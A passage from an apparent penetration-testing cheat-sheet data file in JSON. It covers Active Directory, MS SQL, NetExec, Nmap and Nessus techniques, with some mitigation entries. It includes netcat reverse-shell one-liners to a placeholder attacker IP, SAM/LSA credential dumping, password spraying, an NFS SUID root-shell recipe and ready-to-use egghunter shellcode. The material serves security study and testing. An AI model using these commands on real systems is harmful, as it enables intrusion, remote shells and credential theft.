        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Exploit Missing Library",
        "codes": [
          {
            "lang": "bash",
            "code": "# If binary looks for libmissing.so\n# and /tmp is in library path\ngcc -shared -fPIC -o /tmp/libmissing.so malicious.c"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Zerologon",
    "title": "Mitigation",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Patch Immediately",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Check patch status\nwmic qfe list | findstr KB4571694\n\n# Install August 2020 patches or later\n# KB4571694 (Windows Server 2019)\n# KB4571723 (Windows Server 2016)\n# KB4571729 (Windows Server 2012 R2)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enable Enforcement Mode",
        "codes": [
          {
            "lang": "powershell",
            "code": "# After patching, enable enforcement mode\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\" /v FullSecureChannelProtection /t REG_DWORD /d 1 /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Monitor Netlogon Events",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Enable Netlogon logging\nnltest /dbflag:0x2080ffff"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Mitigations",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Defensive measures:\n- Disable unconstrained delegation where possible\n- Use constrained delegation instead\n- Add sensitive accounts to \"Protected Users\" group\n- Mark accounts as \"Account is sensitive and cannot be delegated\"",
        "variant": "info"
      }
    ]
  },
  {
    "category": "MS SQL Enumeration",
    "title": "MS SQL Authentication",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Windows Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-mssqlclient <Domain>/<User>:<Password>@<Target> -windows-auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "SQL Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-mssqlclient sa:<Password>@<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "PowerUpSQL Connection",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-SQLConnectionTest -Instance <Target>\nGet-SQLServerInfo -Instance <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Test Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc mssql <Target> -u <User> -p <Password>\nnxc mssql <Target> -u <User> -p <Password> -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "MS SQL Enumeration",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Test MS SQL Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc mssql <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute SQL Query",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc mssql <TargetIP> -u <Username> -p '<Password>' -q 'SELECT @@version'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute OS Command via xp_cmdshell",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc mssql <TargetIP> -u <Username> -p '<Password>' -x 'whoami'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Linked Servers",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc mssql <TargetIP> -u <Username> -p '<Password>' -M mssql_priv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "MS SQL Enumeration",
    "title": "MS SQL in Active Directory",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Discover SQL Servers",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p 1433 --script ms-sql-info <TargetRange>"
          },
          {
            "lang": "bash",
            "code": "nxc mssql <TargetRange>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "PowerUpSQL Discovery",
        "codes": [
          {
            "lang": "powershell",
            "code": "Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\nGet-SQLInstanceBroadcast\nGet-SQLInstanceScanUDP"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "SPN Enumeration for SQL",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainUser -SPN | Where-Object { $_.serviceprincipalname -like \"*MSSQL*\" }"
          },
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DC-IP> -D \"<User>@<Domain>\" -w \"<Password>\" -b \"DC=<Domain>,DC=<TLD>\" \"servicePrincipalName=*MSSQL*\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - MSSQL Pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "SQL Server integrates with AD for authentication. Service accounts often have excessive privileges.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "RDP Attacks",
    "title": "Multi-hop RDP",
    "tags": [
      "Lateral_Movement",
      "RDP",
      "Windows"
    ],
    "steps": [
      {
        "title": "Tunnel RDP Through Existing RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp /u:<User1> /p:<Password1> /v:<Target1>"
          },
          {
            "lang": "bash",
            "code": "mstsc.exe /v:<Target2>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "RDP to first host, then RDP to internal host from there.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Vulnerability Scanning with Nessus",
    "title": "Nessus Installation",
    "tags": [
      "Discovery",
      "Network",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "Verify Checksum",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"<Checksum> <Filename>.deb\" > sha256sum_nessus\nsha256sum -c sha256sum_nessus"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Install Package",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo apt install ./<Filename>.deb"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Start Service",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo systemctl start nessusd.service"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Access Web Interface",
        "codes": [
          {
            "lang": "bash",
            "code": "https://127.0.0.1:8834"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Tenable Nessus Documentation",
        "url": "https://docs.tenable.com/nessus/Content/GettingStarted.htm"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Download .deb from **Tenable** website. Requires registration for activation code. Free version (**Essentials**) limited to 16 IPs.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Vulnerability Scanning with Nessus",
    "title": "Nessus Scanning",
    "tags": [
      "Discovery",
      "Network",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "Scan Templates",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Available scan templates:\n- **Host Discovery** - Find live hosts and open ports\n- **Basic Network Scan** - Full scan with predefined settings (recommended)\n- **Advanced Scan** - No predefined settings, full customization\n- **Advanced Dynamic Scan** - Dynamic plugin filter instead of manual selection\n- **Credentialed Patch Audit** - Authenticated scan for missing patches"
          }
        ]
      },
      {
        "title": "Custom Port Range",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Discovery -> Custom -> Port Scanning -> Set port range."
          }
        ]
      },
      {
        "title": "Disable Host Discovery",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Discovery -> Host Discovery -> Toggle \"Ping the remote host\" Off."
          }
        ]
      },
      {
        "title": "Authenticated Scans",
        "substeps": [
          {
            "title": "SSH Credentials (Linux/macOS)",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Credentials -> SSH -> Password -> Enter username/password and sudo credentials."
              }
            ]
          },
          {
            "title": "Windows Credentials",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Use SMB or WMI authentication with local or domain accounts. Consider UAC settings."
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Provides better visibility into local vulnerabilities, missing patches, and outdated software. Creates more noise (logs, AV alerts).",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Dynamic Plugin Filter",
        "codes": [],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Advanced Dynamic Scan** template allows filtering by CVE, plugin family, etc. Dynamic Plugins -> CVE -> Enter CVE number -> Preview Plugins. Add multiple filters to narrow results.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Generate Reports",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Report -> Select template -> PDF -> Generate Report.\n- **Detailed Vulnerabilities By Host** - Full details grouped by host\n- **Complete List of Vulnerabilities by Host** - Summary view"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Tenable Nessus Documentation",
        "url": "https://docs.tenable.com/nessus/Content/GettingStarted.htm"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Scan workflow:\n1. New Scan -> Select template\n2. Configure name and targets\n3. Customize Discovery settings\n4. Add credentials if authenticated\n5. Launch scan",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Netcat Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Traditional Netcat",
        "codes": [
          {
            "lang": "bash",
            "code": "nc -e /bin/bash <AttackerIP> <Port>"
          },
          {
            "lang": "bash",
            "code": "nc -e /bin/sh <AttackerIP> <Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Netcat without -e",
        "codes": [
          {
            "lang": "bash",
            "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <AttackerIP> <Port> >/tmp/f"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use this when **-e** flag is not available (common on BSD netcat).",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Ncat",
        "codes": [
          {
            "lang": "bash",
            "code": "ncat <AttackerIP> <Port> -e /bin/bash"
          },
          {
            "lang": "bash",
            "code": "ncat --udp <AttackerIP> <Port> -e /bin/bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows Netcat",
        "codes": [
          {
            "lang": "bash",
            "code": "nc <AttackerIP> <Port> -e cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "NetExec (nxc)",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "NetExec GitHub",
        "url": "https://github.com/Pennyw0rth/NetExec"
      },
      {
        "text": "NetExec Wiki",
        "url": "https://www.netexec.wiki/"
      },
      {
        "text": "CrackMapExec to NetExec Migration",
        "url": "https://www.netexec.wiki/getting-started/migration-from-cme"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "NetExec (nxc) is the successor to CrackMapExec, providing network enumeration and exploitation capabilities for Windows environments."
      },
      {
        "type": "note",
        "content": "NetExec replaced CrackMapExec in 2023 due to trademark issues. All `cme` commands now use `nxc`.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Password Spraying",
    "title": "NetExec Password Spraying",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Single Password",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u /root/machines/<Machine>/<TargetIP>/usernames -p 'Spring2024!' --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Multiple Passwords (Be Careful with Lockout)",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u /root/machines/<Machine>/<TargetIP>/usernames -p /root/machines/<Machine>/<TargetIP>/passwords --no-bruteforce --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "NetExec Workflow for OSCP",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 1: Enumerate Network",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Identifies live hosts with SMB."
          }
        ]
      },
      {
        "title": "Step 2: Test Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Tests credentials across all hosts."
          }
        ]
      },
      {
        "title": "Step 3: Enumerate Shares",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' --shares"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Spider Shares for Sensitive Files",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' -M spider_plus -o PATTERN=password"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Dump Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --sam --lsa"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Execute Commands on Pwn3d Hosts",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -x 'whoami /all'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Enumeration",
    "title": "Network Configuration",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "Monitor TCP Connections",
        "codes": [
          {
            "lang": "bash",
            "code": "# List all listening, established, and connected TCP sockets every 3 seconds\nwatch --interval 3 ss -t --all"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Listening Sockets",
        "codes": [
          {
            "lang": "bash",
            "code": "# List all listening TCP and UDP sockets with PID/program name\nnetstat -tulpn"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Network Activity by User",
        "codes": [
          {
            "lang": "bash",
            "code": "lsof -i -u <Username> -a"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Set IP Address (ifconfig)",
        "codes": [
          {
            "lang": "bash",
            "code": "ifconfig <InterfaceName> <NewIP> netmask <NewSubnetMask>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Set IP Address (ip)",
        "codes": [
          {
            "lang": "bash",
            "code": "ip addr add <NewIP> dev <InterfaceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add Secondary IP (ifconfig)",
        "codes": [
          {
            "lang": "bash",
            "code": "ifconfig <InterfaceName>:<NewInterfaceName> <NewIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add Secondary IP (ip)",
        "codes": [
          {
            "lang": "bash",
            "code": "ip addr add <NewIP>/<CIDR> dev <InterfaceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Set Default Gateway (route)",
        "codes": [
          {
            "lang": "bash",
            "code": "route add default gw <GatewayIP> <InterfaceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add Route (ip)",
        "codes": [
          {
            "lang": "bash",
            "code": "ip route add <Network>/<CIDR> via <GatewayIP> dev <InterfaceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Change MTU Size (ifconfig)",
        "codes": [
          {
            "lang": "bash",
            "code": "ifconfig <InterfaceName> mtu <Size>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Change MTU Size (ip)",
        "codes": [
          {
            "lang": "bash",
            "code": "ip link set dev <InterfaceName> mtu <Size>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Change MAC Address (ifconfig)",
        "codes": [
          {
            "lang": "bash",
            "code": "ifconfig <InterfaceName> hw ether <MACAddress>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Change MAC Address (ip)",
        "codes": [
          {
            "lang": "bash",
            "code": "ip link set dev <InterfaceName> down\nip link set dev <InterfaceName> address <MACAddress>\nip link set dev <InterfaceName> up"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Wireless Network Scan",
        "codes": [
          {
            "lang": "bash",
            "code": "iwlist <InterfaceName> scan"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List DHCP Assignments",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /var/log/messages | grep DHCP"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kill TCP Connection",
        "codes": [
          {
            "lang": "bash",
            "code": "tcpkill host <IPAddress> and port <Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enable IP Forwarding",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"1\" > /proc/sys/net/ipv4/ip_forward"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add DNS Server",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"nameserver <DNSServer>\" >> /etc/resolv.conf"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Port Scanning with Nmap",
    "title": "Network Discovery",
    "tags": [
      "Discovery",
      "Network",
      "Nmap",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "Host Discovery (Ping Sweep)",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -sn <NetworkRange>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Sends ICMP echo, TCP SYN to port 443, TCP ACK to port 80, and ICMP timestamp."
          }
        ]
      },
      {
        "title": "Save to Greppable Output",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -sn <NetworkRange> -oG hosts.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Extract Live Hosts",
        "codes": [
          {
            "lang": "bash",
            "code": "grep Up hosts.txt | cut -d \" \" -f 2"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Sweep for Specific Port",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p <Port> <NetworkRange> -oG sweep.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Top Ports Scan",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap --top-ports=20 <NetworkRange>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "NFS Exploitation",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Check NFS Exports",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/exports\nshowmount -e <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Mount NFS Share",
        "codes": [
          {
            "lang": "bash",
            "code": "mkdir /tmp/nfs\nmount -t nfs <Target>:/share /tmp/nfs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "no_root_squash Exploitation",
        "codes": [
          {
            "lang": "bash",
            "code": "# On attacker machine (as root)\necho 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > /tmp/nfs/shell.c\ngcc /tmp/nfs/shell.c -o /tmp/nfs/shell\nchmod +s /tmp/nfs/shell\n\n# On target\n/share/shell"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If `no_root_squash` is set, files created as root on client are root on server."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Vulnerability Scanning with Nmap",
    "title": "NSE Vulnerability Scanning",
    "tags": [
      "Discovery",
      "Nmap",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "List Vuln Scripts",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /usr/share/nmap/scripts/script.db | grep \"\\\"vuln\\\"\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Run All Vuln Scripts",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo nmap -sV -p <Port> --script \"vuln\" <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Vulners Script",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo nmap -sV --script vulners <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Queries **Vulners** database for CVEs matching detected service versions. Requires successful service detection (**-sV**). Shows CVSS scores and exploit links marked with *EXPLOIT*.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Run Script by Category",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap --script vuln <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Run Script by Name",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap --script http-vuln-cve2021-41773 <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Run Multiple Scripts",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap --script \"vuln,safe\" <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Run Scripts with Wildcard",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap --script \"http-*\" <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Custom NSE Scripts",
        "substeps": [
          {
            "title": "Add Custom Script",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo cp <Script>.nse /usr/share/nmap/scripts/"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Update Script Database",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo nmap --script-updatedb"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Run Custom Script",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo nmap -sV -p <Port> --script \"<ScriptName>\" <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Download NSE scripts for specific CVEs from GitHub. Always verify scripts are safe before running - malicious scripts can compromise your system.",
            "variant": "danger"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Nmap",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html#nmap"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "NSE scripts extend **Nmap** functionality. Scripts in **vuln** category detect vulnerabilities. **safe** scripts won't crash targets, **intrusive** scripts might.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "NtAccessCheck Egghunter",
    "title": "NtAccessCheckAndAuditAlarm Egghunter",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Egghunter",
      "Exploitation",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "How It Works [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Uses **NtAccessCheckAndAuditAlarm** syscall to test memory accessibility:\n- Syscall returns **STATUS_ACCESS_VIOLATION** (0xc0000005) if address is invalid\n- This allows safe iteration through memory without crashing\n- When valid memory found, compare against egg tag",
            "variant": "info"
          }
        ]
      },
      {
        "title": "NtAccessCheck Egghunter Assembly",
        "codes": [
          {
            "lang": "nasm",
            "code": "loop_inc_page:\n    or dx, 0x0fff           ; Align to page boundary (4095)\nloop_inc_one:\n    inc edx                 ; Increment address\n    push edx                ; Save current address\n    push 0x02               ; NtAccessCheckAndAuditAlarm syscall number\n    pop eax                 ; EAX = 2\n    int 0x2e                ; Call kernel\n    cmp al, 0x05            ; Check for 0xc0000005 (ACCESS_VIOLATION)\n    pop edx                 ; Restore address\n    je loop_inc_page        ; If invalid, skip to next page\n    mov eax, 0x74303077     ; EAX = egg tag (\"w00t\")\n    mov edi, edx            ; EDI = current address\n    scasd                   ; Compare [EDI] with EAX, increment EDI\n    jnz loop_inc_one        ; If not equal, continue search\n    scasd                   ; Compare again (egg is repeated)\n    jnz loop_inc_one        ; If not equal, continue search\n    jmp edi                 ; Jump to shellcode (after egg)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "32-byte egghunter implementation."
          }
        ]
      },
      {
        "title": "Generate with Mona",
        "codes": [
          {
            "lang": "text",
            "code": "!mona egg -t w00t"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create egghunter in **Immunity Debugger** using **mona.py**."
          }
        ]
      },
      {
        "title": "Egghunter Shellcode (Python)",
        "codes": [
          {
            "lang": "python",
            "code": "# NtAccessCheckAndAuditAlarm egghunter\n# Egg: w00t (0x74303077)\negghunter = (\n    b\"\\x66\\x81\\xca\\xff\\x0f\"     # or dx, 0x0fff\n    b\"\\x42\"                     # inc edx\n    b\"\\x52\"                     # push edx\n    b\"\\x6a\\x02\"                 # push 0x02\n    b\"\\x58\"                     # pop eax\n    b\"\\xcd\\x2e\"                 # int 0x2e\n    b\"\\x3c\\x05\"                 # cmp al, 0x05\n    b\"\\x5a\"                     # pop edx\n    b\"\\x74\\xef\"                 # je loop_inc_page\n    b\"\\xb8\\x77\\x30\\x30\\x74\"     # mov eax, 0x74303077 (w00t)\n    b\"\\x8b\\xfa\"                 # mov edi, edx\n    b\"\\xaf\"                     # scasd\n    b\"\\x75\\xea\"                 # jnz loop_inc_one\n    b\"\\xaf\"                     # scasd\n    b\"\\x75\\xe7\"                 # jnz loop_inc_one\n    b\"\\xff\\xe7\"                 # jmp edi\n)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ready-to-use egghunter bytes."
          }
        ]
      },
      {
        "title": "Change Egg Tag",
        "codes": [
          {
            "lang": "python",
